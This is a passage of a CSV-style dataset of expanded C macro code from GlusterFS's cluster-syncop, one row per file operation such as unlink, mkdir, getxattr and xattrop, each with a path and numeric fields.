= cluster_rmdir_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->rmdir); subvols[__i]->fops->rmdir (_new, subvols[__i], loc, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                 ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->unlink_cbk) tmp_cbk = cluster_unlink_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->unlink""; _new->unwind_to = ""cluster_unlink_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->unlink_cbk = cluster_unlink_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->unlink); subvols[__i]->fops->unlink (_new, subvols[__i], loc, xflag, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->unlink_cbk) tmp_cbk = cluster_unlink_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->unlink""; _new->unwind_to = ""cluster_unlink_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->unlink_cbk = cluster_unlink_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->unlink); subvols[__i]->fops->unlink (_new, subvols[__i], loc, xflag, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                 ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->mkdir_cbk) tmp_cbk = cluster_mkdir_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->mkdir""; _new->unwind_to = ""cluster_mkdir_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->mkdir_cbk = cluster_mkdir_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->mkdir); subvols[__i]->fops->mkdir (_new, subvols[__i], loc, mode, umask, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"               mode_t umask, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->mkdir_cbk) tmp_cbk = cluster_mkdir_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->mkdir""; _new->unwind_to = ""cluster_mkdir_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->mkdir_cbk = cluster_mkdir_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->mkdir); subvols[__i]->fops->mkdir (_new, subvols[__i], loc, mode, umask, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                       ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->mknod_cbk) tmp_cbk = cluster_mknod_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->mknod""; _new->unwind_to = ""cluster_mknod_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->mknod_cbk = cluster_mknod_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->mknod); subvols[__i]->fops->mknod (_new, subvols[__i], loc, mode, rdev, umask, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"               dev_t rdev, mode_t umask, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->mknod_cbk) tmp_cbk = cluster_mknod_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->mknod""; _new->unwind_to = ""cluster_mknod_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->mknod_cbk = cluster_mknod_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->mknod); subvols[__i]->fops->mknod (_new, subvols[__i], loc, mode, rdev, umask, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                             ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->readlink_cbk) tmp_cbk = cluster_readlink_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->readlink""; _new->unwind_to = ""cluster_readlink_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->readlink_cbk = cluster_readlink_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->readlink); subvols[__i]->fops->readlink (_new, subvols[__i], loc, size, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                  dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->readlink_cbk) tmp_cbk = cluster_readlink_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->readlink""; _new->unwind_to = ""cluster_readlink_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->readlink_cbk = cluster_readlink_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->readlink); subvols[__i]->fops->readlink (_new, subvols[__i], loc, size, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->access_cbk) tmp_cbk = cluster_access_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->access""; _new->unwind_to = ""cluster_access_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->access_cbk = cluster_access_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->access); subvols[__i]->fops->access (_new, subvols[__i], loc, mask, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->access_cbk) tmp_cbk = cluster_access_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->access""; _new->unwind_to = ""cluster_access_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->access_cbk = cluster_access_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->access); subvols[__i]->fops->access (_new, subvols[__i], loc, mask, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->ftruncate_cbk) tmp_cbk = cluster_ftruncate_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->ftruncate""; _new->unwind_to = ""cluster_ftruncate_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->ftruncate_cbk = cluster_ftruncate_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->ftruncate); subvols[__i]->fops->ftruncate (_new, subvols[__i], fd, offset, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                   dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->ftruncate_cbk) tmp_cbk = cluster_ftruncate_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->ftruncate""; _new->unwind_to = ""cluster_ftruncate_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->ftruncate_cbk = cluster_ftruncate_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->ftruncate); subvols[__i]->fops->ftruncate (_new, subvols[__i], fd, offset, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                  ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->getxattr_cbk) tmp_cbk = cluster_getxattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->getxattr""; _new->unwind_to = ""cluster_getxattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->getxattr_cbk = cluster_getxattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->getxattr); subvols[__i]->fops->getxattr (_new, subvols[__i], loc, name, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                  const char *name, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->getxattr_cbk) tmp_cbk = cluster_getxattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->getxattr""; _new->unwind_to = ""cluster_getxattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->getxattr_cbk = cluster_getxattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->getxattr); subvols[__i]->fops->getxattr (_new, subvols[__i], loc, name, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->xattrop_cbk) tmp_cbk = cluster_xattrop_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->xattrop""; _new->unwind_to = ""cluster_xattrop_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->xattrop_cbk = cluster_xattrop_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->xattrop); subvols[__i]->fops->xattrop (_new, subvols[__i], loc, flags, dict, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                 gf_xattrop_flags_t flags, dict_t *dict, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->xattrop_cbk) tmp_cbk = cluster_xattrop_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->xattrop""; _new->unwind_to = ""cluster_xattrop_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->xattrop_cbk = cluster_xattrop_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->xattrop); subvols[__i]->fops->xattrop (_new, subvols[__i], loc, flags, dict, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                       ;
        return fop_success_fill (replies, numsubvols, output);
"
